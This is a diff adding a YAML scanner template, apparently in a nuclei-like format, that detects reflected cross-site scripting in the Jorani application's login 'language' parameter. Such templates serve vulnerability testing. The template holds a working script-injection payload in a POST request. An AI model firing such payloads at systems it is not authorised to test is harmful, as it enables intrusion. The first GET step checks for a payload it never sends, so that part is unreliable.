@@ -1,0 +1,52 @@
+id: jorani-benjamin-xss
+brief:
+    title: Jorani v1.0.3-2014-2023 Benjamin BALET - Cross-Site Scripting
+    by: ritikchaddha
+    level: medium
+    about: The value of the `language request` parameter is copied into a JavaScript string which is encapsulated in double quotation marks. The payload 75943";alert(1)//569 was submitted in the language para...
+    label:
+        - packetstorm
+        - jorani
+        - benjamin
+        - xss
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/session/login'
+      signs:
+        - "on": word
+          has:
+            - <script>alert(document.domain)</script>
+            - _jorani
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: POST
+      to:
+        - '{{BaseURL}}/session/login'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: csrf_test_jorani={{csrf}}&last_page=session%2Flogin&language=en-GBarh5l%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3ennois&login={{randstr}}&CipheredValue=
+      signs:
+        - "on": word
+          has:
+            - <script>alert(document.domain)</script>
+            - _jorani
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
